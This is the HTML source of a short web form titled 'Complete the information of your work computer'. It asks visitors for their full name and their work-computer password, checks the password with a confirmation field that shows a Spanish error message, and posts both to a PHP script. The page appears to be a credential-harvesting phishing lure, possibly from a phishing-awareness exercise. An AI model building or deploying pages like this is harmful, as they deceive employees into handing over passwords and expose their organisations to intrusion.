<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="/assets/css/styles.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Josefin+Sans:ital@0;1&display=swap"
    rel="stylesheet"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Josefin+Sans:ital,wght@0,300;1,300&display=swap"
    rel="stylesheet"
  />
  <title>Complete Work Computer Info</title> </head>
<body>
  <div class="container">
    <div class="form-container">
      <img src="/assets/images/EyeCatch.png" alt="logo" class="eynlogo" />
      <h1 class="form-title">Complete the information of your work computer</h1>
      <form method="POST" action="/scripts/process_form.php">
        <input
          type="text"
          id="username"
          name="username"
          required
          placeholder="Full Name"
        />
        <input
          type="password"
          id="password"
          name="password"
          required
          placeholder="Password of your work computer"
        />
          <input
            type="password"
            id="confirm_password"
            name="confirm_password"
            required
            placeholder="Confirm Password"
            oninput="this.setCustomValidity(this.value !== document.getElementById('password').value ? 'Las contraseñas no coinciden' : '')"
          />

        <button type="submit">Send Info</button>
      </form>
    </div>
  </div>
</body>